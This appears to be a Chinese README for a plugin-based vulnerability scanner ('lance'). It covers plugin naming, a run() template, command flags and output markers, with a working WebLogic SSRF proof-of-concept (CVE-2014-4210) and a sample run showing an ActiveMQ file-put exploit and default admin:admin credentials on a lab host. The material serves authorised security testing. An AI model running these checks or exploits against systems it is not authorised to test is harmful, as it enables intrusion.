[TOC]
## plugin示例模板

plugin名称应该以中间件或cms框架或其它关键字的小写开头 \+ "\_" \+ 漏洞说明关键字。
e.g.

`activemq_weakpwd`、`weblogic_ssrf`、`discuz_faqsql`、`weblogic_xmldecoder`

plugin内容示例如下：

```python
def run(str):
    """Introduction"""
    # do something
    if `a`:
        return `result`
    else:
        return False
```

e.g.

```python
import requests

def run(url):
    """CVE-2014-4210"""
    payload = ":7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
    req = requests.get(url+payload, timeout=10, verify=False)
    if "weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and "IO Exception on sendMessage" not in req.text:
        return "WebLogic ssrf Vulnerable"
    else:
        return False
```

## 参数说明

```xml
python -u <ip or url> -m <poc or exp>
-u    target url or ip address

-m    poc or exp to be loaded

```

## 输出提示说明

```
[+] 存在漏洞 或 插件执行成功

[-] 不存在漏洞 或 插件执行失败

[*] 输出程序提示信息

[!] 输出程序错误信息
```

e.g.

```
root@kali:~/lance# python3 lance.py -u 192.168.27.128 -m activemq
[06:17:03] [*] Target url: http://192.168.27.128
[06:17:03] [*] Plugin path: /root/lance/plugins 
[06:17:03] [*] Loading activemq plugins.
[06:17:03] [*] Loading plugin: activemq_putfile
[06:17:03] [+] ActiveMQ put file success
[06:17:03] [*] Loading plugin: activemq_movefile
[06:17:03] [-] Not Vulnerable activemq_movefile 
[06:17:03] [*] Loading plugin: activemq_weakpwd
[06:17:03] [+] ActiveMQ weak password!  http://192.168.27.128:8161/admin/   username:admin, pwd:admin
[06:17:03] [*] Finished
root@kali:~/lance#
```